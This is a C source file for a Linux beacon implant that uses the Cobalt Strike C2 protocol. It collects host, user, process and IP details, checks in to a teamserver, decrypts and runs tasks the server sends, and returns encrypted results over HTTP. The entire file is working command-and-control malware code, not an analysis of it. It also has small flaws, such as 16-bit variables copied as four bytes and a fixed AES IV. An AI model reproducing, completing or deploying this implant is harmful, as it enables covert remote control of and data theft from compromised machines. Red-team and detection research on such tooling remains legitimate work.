#include "beacon.h"
#include "crypto.h"
#include "http.h"
#include "commands.h"
#include "config.h"
#include "profile.h"
#include "transform.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/utsname.h>
#include <time.h>
#include <arpa/inet.h>
#include <openssl/sha.h>
#include <openssl/hmac.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <ifaddrs.h>
#include "debug.h"

// Global sleep configuration (extern from main.c)
extern int g_sleep_time_ms;
extern int g_jitter_percent;

// Define the RSA public key here (declared as extern in config.h)
unsigned char BEACON_PUBLIC_KEY[256] = "\x30";

unsigned int BEACON_PUBLIC_KEY_LEN = 256;

// Metadata flags
#define METADATA_FLAG_AGENT_X64  2
#define METADATA_FLAG_TARGET_X64 4
#define METADATA_FLAG_ADMIN      8

#define HMAC_SIZE 16

// Get local IP address (non-loopback interface)  
uint32_t beacon_get_local_ip()
{
    struct ifaddrs *ifaddr, *ifa;
    uint32_t ip = 0;
    
    if (getifaddrs(&ifaddr) == -1) {
        return 0x0100007f; // Fallback to 127.0.0.1 in LITTLE endian
    }
    
    for (ifa = ifaddr; ifa != NULL; ifa = ifa->ifa_next) {
        if (ifa->ifa_addr == NULL)
            continue;
        
        // Check for IPv4 address
        if (ifa->ifa_addr->sa_family == AF_INET) {
            struct sockaddr_in *addr = (struct sockaddr_in *)ifa->ifa_addr;
            uint32_t test_ip = addr->sin_addr.s_addr;
            
            // Skip loopback (127.x.x.x)
            uint8_t first_octet = test_ip & 0xFF;
            if (first_octet == 127)
                continue;
            
            // Skip link-local (169.254.x.x)
            if (first_octet == 169 && ((test_ip >> 8) & 0xFF) == 254)
                continue;
            
            // Found a good IP - already in correct byte order (little endian)
            ip = test_ip;
            break;
        }
    }
    
    freeifaddrs(ifaddr);
    
    // If no IP found, use 127.0.0.1 in little endian
    if (ip == 0) {
        ip = 0x0100007f;
    }
    
    return ip;
}

// Generate random agent ID
uint32_t rand32(void) { 
    return ((uint32_t)rand() << 16) ^ rand();
}

int beacon_init(beacon_state_t *state) {
    memset(state, 0, sizeof(beacon_state_t));
    
    crypto_random_bytes((uint8_t*)state->session_key, 16);
    
    memcpy(state->aes_iv, "abcdefghijklmnop", 16);
    
    unsigned char key_material[32];
    SHA256((unsigned char*)state->session_key, 16, key_material);
    
    memcpy(state->aes_key, key_material, 16);
    memcpy(state->hmac_key, key_material + 16, 16);
    
    srand(time(NULL) ^ getpid());
    int32_t id = rand32() & 0x7FFFFFFF & ~1;
    state->agent_id = id;
    
    state->connected = 0;
    state->pending_tasks = NULL;
    state->tasks_len = 0;
    state->last_server_time = 0;
    state->upload_counter = 0;
    state->output_buffer = NULL;
    state->output_len = 0;

    profile_load_from_generated(&state->profile);
    profile_validate(&state->profile);
    profile_select_uris(&state->profile);
    
    return 0;
}

uint8_t* beacon_generate_metadata(beacon_state_t *state, size_t *out_len)
{
    // View the metadata of the beacon: python3 cs-decrypt-metadata.py -f .cobaltstrike.beacon_keys "<ENCRYPTED METADATA COOKIE>"
    // Metadata format:
    // [4 bytes]  Magic number (0x0000BEEF) - BIG ENDIAN
    // [4 bytes]  Length of metadata (excluding 8-byte header) - BIG ENDIAN
    // [16 bytes] Session ID/AES key (raw bytes, no conversion)
    // [2 bytes]  ANSI charset (1252) - LITTLE ENDIAN
    // [2 bytes]  OEM charset (437) - LITTLE ENDIAN
    // [4 bytes]  Agent ID - BIG ENDIAN
    // [4 bytes]  Process ID - BIG ENDIAN
    // [2 bytes]  Port (0 for non-SSH) - BIG ENDIAN
    // [1 byte]   Flags
    // [1 byte]   Major OS version
    // [1 byte]   Minor OS version
    // [2 bytes]  Build number - BIG ENDIAN
    // [4 bytes]  GetProcAddress HIGH (Can be set to 0) - BIG ENDIAN
    // [4 bytes]  GetModuleHandleA LOW (Can be set to 0) - BIG ENDIAN
    // [4 bytes]  GetProcAddress LOW (Can be set to 0) - BIG ENDIAN
    // [4 bytes]  Local IP address - LITTLE ENDIAN (raw from sockaddr)
    // [variable] Tab-delimited: computer\tuser\tprocessname (max 58 bytes)
    
    uint8_t *metadata = malloc(256);
    if (!metadata) return NULL;
    
    size_t offset = 0;
    
    // Reserve space for magic number and length (will fill in later)
    offset = 8;
    
    // Session key (16 bytes) - raw bytes, no byte order conversion
    memcpy(metadata + offset, state->session_key, 16);
    offset += 16;
    
    // ANSI charset (1252 = 0x04E4) - LITTLE ENDIAN
    metadata[offset++] = 0xE4;
    metadata[offset++] = 0x04;
    
    // OEM charset (437 = 0x01B5) - LITTLE ENDIAN  
    metadata[offset++] = 0xB5;
    metadata[offset++] = 0x01;
    
    // Agent ID (4 bytes) - BIG ENDIAN
    uint32_t agent_id_be = htonl(state->agent_id);
    memcpy(metadata + offset, &agent_id_be, 4);
    offset += 4;
    
    // Process ID (4 bytes) - BIG ENDIAN
    uint32_t pid = getpid();
    uint32_t pid_be = htonl(pid);
    memcpy(metadata + offset, &pid_be, 4);
    offset += 4;
    
    // Port (2 bytes) - BIG ENDIAN
    uint16_t port = htons(0);
    memcpy(metadata + offset, &port, 2);
    offset += 2;
    
    // Flags (1 byte) - Don't set METADATA_FLAG_NOTHING (value 1) for 64-bit beacons
    uint8_t flags = 0;
    if (sizeof(void*) == 8) {
        flags |= METADATA_FLAG_AGENT_X64;
        flags |= METADATA_FLAG_TARGET_X64;
    }
    // Check if root/admin
    if (geteuid() == 0) {
        flags |= METADATA_FLAG_ADMIN;
    }
    metadata[offset++] = flags;
    
    // OS Version info
    struct utsname uts;
    uname(&uts);
    
    /*
    struct utsname {
      char sysname[];   // Operating system name (e.g., "Linux")
      char nodename[];  // Hostname
      char release[];   // OS release (e.g., "5.15.0")
      char version[];   // OS version
      char machine[];   // Hardware identifier (e.g., "x86_64")
    };
    */
    
    // Parse Linux kernel version (e.g., "5.15.0")
    int major = 0, minor = 0, build = 0;
    sscanf(uts.release, "%d.%d.%d", &major, &minor, &build);
    
    metadata[offset++] = (uint8_t)major;         // Major version (1 byte) (var1)
    metadata[offset++] = (uint8_t)minor;         // Minor version (1 byte) (var2)
    
    uint16_t build_num = htons((uint16_t)9200); // Build number (2 bytes) - BIG ENDIAN (var3)
    memcpy(metadata + offset, &build_num, 2);
    offset += 2;
  
    
    uint16_t var4 = htonl((uint16_t)0x7ffc);
    memcpy(metadata + offset, &var4, 4);  // var4
    offset += 4;
 
    uint16_t var5 = htons((uint16_t)0xfae2f3f0);
    memcpy(metadata + offset, &var5, 4);  // var5
    offset += 4;
    
    uint16_t var6 = htons((uint16_t)0xfae2b200);
    memcpy(metadata + offset, &var6, 4);  // var6
    offset += 4;
    
    //(VAR 7)
    // Local IP address (4 bytes) - BIG ENDIAN
    // sin_addr.s_addr is in network byte order (big endian on wire, stored as uint32 in host order)
    // We need to store it as BIG endian in metadata
    uint32_t local_ip = beacon_get_local_ip();
    uint32_t local_ip_be = htonl(local_ip);
    memcpy(metadata + offset, &local_ip_be, 4);
    offset += 4;
    
    // Tab-delimited metadata string: computer\tuser\tprocessname
    // Maximum 58 bytes as per Cobalt Strike source
    char info_str[128];
    const char *user = getenv("USER");
    if (!user) user = "unknown";
    
    char procname[32] = { 0 };
    FILE* fileptr = fopen("/proc/self/status", "r");
    if (fileptr == NULL)
    {
        snprintf(procname, sizeof(procname), "linuxbeacon");
    }
    else
    {
        char tmp[40];
        if (fgets(tmp, sizeof(tmp), fileptr))
        {
            sscanf(tmp, "Name:%31s", procname);
        }
        
        fclose(fileptr);
    }
    
    int info_len = snprintf(info_str, sizeof(info_str), "%s\t%s\t%s", uts.nodename, user, procname);
    
    // Truncate to 58 bytes if necessary
    if (info_len > 58) {
        info_len = 58;
    }
    
    memcpy(metadata + offset, info_str, info_len);
    offset += info_len;
    
    // Now fill in the header (magic number and length)
    // Magic number (0x0000BEEF) in network byte order (big-endian)
    uint32_t magic = htonl(0x0000BEEF);
    memcpy(metadata, &magic, 4);
    
    // Length of metadata (excluding the 8-byte header) in network byte order
    uint32_t data_len = htonl(offset - 8);
    memcpy(metadata + 4, &data_len, 4);
    
    *out_len = offset;
  
    return metadata;
}

int beacon_decrypt_tasks(beacon_state_t *state, const uint8_t *ciphertext, size_t ciphertext_len, uint8_t **plaintext_out, size_t *plaintext_len_out)
{
	// Decrypt tasks from server
	// [counter:4][length:4][data][HMAC:16] - all encrypted except HMAC
	
    // Minimum size check
    if (ciphertext_len <= HMAC_SIZE)
	{
        DEBUG_PRINT("Ciphertext too small: %zu bytes\n", ciphertext_len);
        return -1;
    }
    
    // Must be multiple of 16 (AES block size)
    if ((ciphertext_len % 16) != 0)
	{
        DEBUG_PRINT("Ciphertext not aligned to 16 bytes\n");
        return -1;
    }
    
    // Extract and verify HMAC
    size_t encrypted_len = ciphertext_len - HMAC_SIZE;
    const uint8_t *hmac_received = ciphertext + encrypted_len;
    
    unsigned char hmac_calculated[EVP_MAX_MD_SIZE];
    unsigned int hmac_len = 0;
    
	DEBUG_HEX("HMAC Key", state->hmac_key, 16);
    
    HMAC(EVP_sha256(), state->hmac_key, 16, ciphertext, encrypted_len, hmac_calculated, &hmac_len);
    
	DEBUG_HEX("HMAC received", hmac_received, HMAC_SIZE);
	
	DEBUG_HEX("HMAC calculated", hmac_calculated, HMAC_SIZE);
    
    if (memcmp(hmac_received, hmac_calculated, HMAC_SIZE) != 0)
	{
        DEBUG_PRINT("HMAC verification failed\n");
        return -1;
    }
    
    DEBUG_PRINT("HMAC verification passed!\n");
    
    DEBUG_PRINT("About to decrypt %zu bytes\n", encrypted_len);
    
	DEBUG_HEX("AES Key", state->aes_key, 16);

	DEBUG_HEX("AES IV", state->aes_iv, 16);

	DEBUG_HEX("Ciphertext (first 32 bytes)", ciphertext, 32);
    
    // Make a copy of IV for decryption (EVP functions may modify it)
    uint8_t iv_copy[16];
    memcpy(iv_copy, state->aes_iv, 16);
    
    // Decrypt the data (counter + length + actual data)
    uint8_t *decrypted = malloc(encrypted_len);
    size_t decrypted_len = encrypted_len;
    
    if (crypto_aes_decrypt(state->aes_key, iv_copy, ciphertext, encrypted_len, decrypted, &decrypted_len) != 0)
	{
        DEBUG_PRINT("AES decryption failed\n");
        free(decrypted);
        return -1;
    }
    
    DEBUG_PRINT("Decrypted %zu bytes\n", decrypted_len);
	
	DEBUG_HEX("Decrypted bytes (first 32 bytes)", decrypted, 32);
    
    // Parse counter and length
    if (decrypted_len < 8)
	{
        DEBUG_PRINT("Decrypted data too small\n");
        free(decrypted);
        return -1;
    }
    
    uint32_t counter = ntohl(*((uint32_t*)decrypted));
    uint32_t data_len = ntohl(*((uint32_t*)(decrypted + 4)));
    
    DEBUG_PRINT("Counter: %u, Data length: %u\n", counter, data_len);
    
    // The "counter" from the server is actually a Unix timestamp. The original Windows beacon
    // uses a large tolerance (1 hour) to prevent replay errors caused by clock drift or
    // asynchronous C2 channels (like DNS) where message order isn't guaranteed.
    // A check is added to ensure the received timestamp isn't unreasonably old.
    // We only perform this check if last_server_time has been initialized (is > 0).
    if (state->last_server_time > 0 && (counter + 3600) < state->last_server_time)
	{
        DEBUG_PRINT("Counter replay detected (current: %u, last: %u, tolerance: 3600)\n", counter, state->last_server_time);
        free(decrypted);
        return -1;
    }
    // Update the last seen server time with the current timestamp.
    state->last_server_time = counter;
    
    // Verify data length
    if (data_len == 0 || data_len > (decrypted_len - 8))
	{
        DEBUG_PRINT("Invalid data length\n");
        free(decrypted);
        return -1;
    }
    
    // Extract the actual task data
    *plaintext_out = malloc(data_len);
    memcpy(*plaintext_out, decrypted + 8, data_len);
    *plaintext_len_out = data_len;
    
    free(decrypted);
    return 0;
}

int beacon_checkin(beacon_state_t *state)
{
    /* GET Response format:
        
        ENCRYPTED PORTION:
        [4 bytes] Counter
        [4 bytes] Length of entire task data
        [N bytes] Full Task Data
            TASK 1
            [4 bytes] Command ID
            [4 bytes] Length of command-specific data
            [N bytes] Command specific data
            TASK 2
            [4 bytes] Command ID (COMMAND_SLEEP)
            [4 bytes] Length of command-specific data (8)
            [8 bytes] Command specific data (5000ms - 4 bytes, 10% jitter - 4 bytes)
            Task 3
            [4 bytes] Command ID (COMMAND_PWD)
            [4 bytes] Length of command-specific data (0)
            [N bytes] Command specific data (0)
        
        [16 bytes] HMAC (NOT ENCRYPTED)
    */

    // Generate metadata
    size_t metadata_len;
    uint8_t *metadata = beacon_generate_metadata(state, &metadata_len);
    if (!metadata) {
        return -1;
    }
    
	//DEBUG_HEX("Session key (raw)", state->session_key, 16);
    
	//DEBUG_HEX("AES key (derived)", state->aes_key, 16);
    
    // RSA encrypt the metadata
    uint8_t encrypted_metadata[256];
    size_t encrypted_len = 256;
    
    if (crypto_rsa_encrypt(metadata, metadata_len, encrypted_metadata, &encrypted_len) != 0)
    {
        ERROR_PRINT("Failed to RSA encrypt metadata\n");
        free(metadata);
        return -1;
    }
    
    // Send encrypted metadata via profile-driven HTTP GET
    http_response_t response;
    if (http_profile_get(&state->profile, encrypted_metadata, encrypted_len, &response) != 0)
    {
        free(metadata);
        return -1;
    }
    
    free(metadata);
    
    // If server sent tasks back, decrypt and process them
    if (response.data && response.size > 0)
	{
        DEBUG_PRINT("Received GET response: %zu bytes\n", response.size);

        // On the first checkin, skip task processing to avoid sending
        // multiple POST responses (PWD, SLEEP, etc.) before the teamserver
        // has finished registering the session. This prevents the
        // "Dropped responses from session" error.
        int first_checkin = !state->connected;

        size_t decoded_len = 0;
        uint8_t *decoded = transform_decode((uint8_t*)response.data, response.size,
                                            &state->profile.server_get_transform, &decoded_len);

        if (decoded && decoded_len > 0) {
            DEBUG_PRINT("Transform decode succeeded: %zu bytes\n", decoded_len);
            uint8_t* task_data = NULL;
            size_t task_len = 0;

            if (beacon_decrypt_tasks(state, decoded, decoded_len, &task_data, &task_len) == 0)
            {
                if (task_len == 0) {
                    DEBUG_PRINT("Decrypted task is empty - no tasks\n");
                } else if (first_checkin) {
                    DEBUG_PRINT("First checkin: deferring %zu bytes of tasks to next checkin\n", task_len);
                } else {
                    DEBUG_PRINT("Decrypted task: %zu bytes\n", task_len);
                    commands_parse_tasks(task_data, task_len);
                }
                free(task_data);
            }
            else
            {
                DEBUG_PRINT("Failed to decrypt tasks - ignoring response\n");
            }
            free(decoded);
        }
        else
        {
            DEBUG_PRINT("Transform decode failed or returned empty - no tasks in response\n");
        }
    }
	else
	{
        //DEBUG_PRINT("No response data from server\n");
    }
    
    http_response_free(&response);
    state->connected = 1;
    
    return 0;
}

int beacon_send_output(beacon_state_t *state, const char *output, size_t len)
{
    // This function sends task output (callbacks) to the C2 server.

    // The final packet format sent via POST is:
    // [Total Length: 4 bytes] [ENCRYPTED DATA] [HMAC: 16 bytes]
    
    // The structure of the [ENCRYPTED DATA] is:
    // [Counter: 4 bytes] [Data Size: 4 bytes] [Type: 4 bytes] [Task Data: N bytes]
    //
    // - The Total Length is unencrypted (big-endian) and equals the size of [ENCRYPTED DATA] + [HMAC].
    // - The HMAC is calculated over the [ENCRYPTED DATA] portion.
   
    // For this client-to-server direction, the 'Counter' is a simple incrementing integer.
    uint32_t counter = state->upload_counter++;
    uint32_t counter_be = htonl(counter);
    uint32_t length_be = htonl((uint32_t)len);  // This is the total packet length (type + data)
    
    // Parse the callback type from the output data
    // Output format from commands.c: [4 bytes: callback type][actual data]
    uint32_t callback_type = 0;
    const char *actual_data = output;
    size_t actual_data_len = len;
    
    if (len >= 4) {
        callback_type = ntohl(*(uint32_t*)output);
        actual_data = output + 4;
        actual_data_len = len - 4;
    }
    
    uint32_t type_be = htonl(callback_type);
    
    size_t plaintext_size = 12 + actual_data_len;  // counter(4) + length(4) + type(4) + data
    uint8_t *plaintext = malloc(plaintext_size);
    if (!plaintext) {
        return -1;
    }
    
    memcpy(plaintext, &counter_be, 4);
    memcpy(plaintext + 4, &length_be, 4);
    memcpy(plaintext + 8, &type_be, 4);
    memcpy(plaintext + 12, actual_data, actual_data_len);
    
#ifdef DEBUG
    printf("Sending output: counter=%u, total_length=%zu, type=%u\n", state->upload_counter, len, callback_type);
    printf("===== PLAINTEXT BREAKDOWN (%zu bytes) =====\n", plaintext_size);
    printf("[Counter]        = %02x %02x %02x %02x (value: %u)\n", plaintext[0], plaintext[1], plaintext[2], plaintext[3], state->upload_counter);
    printf("[Data Size]      = %02x %02x %02x %02x (value: %zu bytes)\n", plaintext[4], plaintext[5], plaintext[6], plaintext[7], len);
    printf("[Type]           = %02x %02x %02x %02x (value: %u)\n", plaintext[8], plaintext[9], plaintext[10], plaintext[11], callback_type);


    // Print the actual data content
    if (actual_data_len > 0)
	{
        printf("[Task Data]      = ");
        for(size_t i = 0; i < actual_data_len; i++)
		{
            printf("%02x ", plaintext[12 + i]);
            if ((i + 1) % 16 == 0 && (i + 1) < actual_data_len)
			{
                printf("\n                   ");
            }
        }
        printf("\n");
        printf("[Task ASCII]     = \"");
        for(size_t i = 0; i < actual_data_len; i++)
		{
            char c = plaintext[12 + i];
            if (c >= 32 && c <= 126)
			{
                printf("%c", c);
            }
			else
			{
                printf(".");
            }
        }
        printf("\"\n");
    }
    printf("==========================================\n");
    printf("\n");
#endif
    
    // Make a copy of IV for encryption (EVP functions may modify it)
    uint8_t iv_copy[16];
    memcpy(iv_copy, state->aes_iv, 16);
    
    // Encrypt with AES
    uint8_t *encrypted = malloc(plaintext_size + 16); // Extra space for padding
    size_t encrypted_len = plaintext_size + 16;
    
    if (crypto_aes_encrypt(state->aes_key, iv_copy, plaintext, plaintext_size, encrypted, &encrypted_len) != 0)
	{
        free(plaintext);
        free(encrypted);
        return -1;
    }
    
    free(plaintext);
    
    DEBUG_PRINT("Encrypted %zu bytes\n", encrypted_len);
	DEBUG_HEX("Encrypted data (first 32 bytes)", encrypted, 32);
    
    // Compute HMAC over encrypted data
    unsigned char hmac[EVP_MAX_MD_SIZE];
    unsigned int hmac_len = 0;
    
    HMAC(EVP_sha256(), state->hmac_key, 16, encrypted, encrypted_len, hmac, &hmac_len);
    
	DEBUG_HEX("HMAC (first 16 bytes)", hmac, 16);
    
    // Build final packet: [Total Length - UNENCRYPTED][encrypted data][HMAC]
    // Total length = total packet size minus the 4-byte length field itself
    // So: encrypted_len + HMAC (16) = everything except the length field
    uint32_t total_length_be = htonl((uint32_t)(encrypted_len + 16));
    
    size_t total_len = 4 + encrypted_len + 16; // length(4) + encrypted + HMAC(16)
    uint8_t *packet = malloc(total_len);
    if (!packet) {
        free(encrypted);
        return -1;
    }
    
    memcpy(packet, &total_length_be, 4);           // Unencrypted length (first 4 bytes)
    memcpy(packet + 4, encrypted, encrypted_len);   // Encrypted data
    memcpy(packet + 4 + encrypted_len, hmac, 16);   // HMAC
    
    free(encrypted);
	
#ifdef DEBUG
    printf("===== FINAL PACKET STRUCTURE =====\n");
    printf("[Total Length]   = %02x %02x %02x %02x (value: %u bytes, UNENCRYPTED)\n",
           packet[0], packet[1], packet[2], packet[3], (unsigned int)(encrypted_len + 16));
    printf("[Encrypted Data] = %zu bytes\n", encrypted_len);
    printf("[HMAC]           = 16 bytes\n");
    printf("[Total Packet]   = %zu bytes (length field + encrypted + HMAC)\n", total_len);
#endif

	DEBUG_HEX("Complete packet", packet, total_len);
    
    char session_id[33];
    snprintf(session_id, sizeof(session_id), "%d", state->agent_id);
    
    DEBUG_PRINT("Sending POST request with %zu bytes\n", total_len);
    
    http_response_t response;
    int ret = http_profile_post(&state->profile, packet, total_len,
                                (uint8_t*)session_id, strlen(session_id), &response);
    
    free(packet);

    // Process response from POST - server may send new tasks
    if (ret == 0 && response.data && response.size > 0)
    {
        DEBUG_PRINT("Received POST response: %zu bytes\n", response.size);

        size_t decoded_len = 0;
        uint8_t *decoded = transform_decode((uint8_t*)response.data, response.size,
                                            &state->profile.server_post_transform, &decoded_len);

        if (decoded && decoded_len > 0) {
            uint8_t* task_data = NULL;
            size_t task_len = 0;

            if (beacon_decrypt_tasks(state, decoded, decoded_len, &task_data, &task_len) == 0)
            {
                DEBUG_PRINT("Decrypted task from POST: %zu bytes\n", task_len);
                commands_parse_tasks(task_data, task_len);
                free(task_data);
            }
            else
            {
                DEBUG_PRINT("Failed to decrypt tasks from POST\n");
            }
            free(decoded);
        }
    }

    http_response_free(&response);

    return ret;
}

void beacon_sleep(void)
{
    // Apply jitter
    int jitter_ms = (g_sleep_time_ms * g_jitter_percent) / 100;
    int actual_sleep = g_sleep_time_ms + (rand() % (jitter_ms * 2 + 1)) - jitter_ms;
    
    if (actual_sleep < 0) actual_sleep = g_sleep_time_ms;
    
    DEBUG_PRINT("[*] Sleeping for %dms (configured: %dms, jitter: %d%%)\n", actual_sleep, g_sleep_time_ms, g_jitter_percent);
    
    usleep(actual_sleep * 1000); // usleep takes microseconds
}

void beacon_cleanup(beacon_state_t *state)
{
    if (state->pending_tasks) {
        free(state->pending_tasks);
        state->pending_tasks = NULL;
    }
    memset(state, 0, sizeof(beacon_state_t));
}
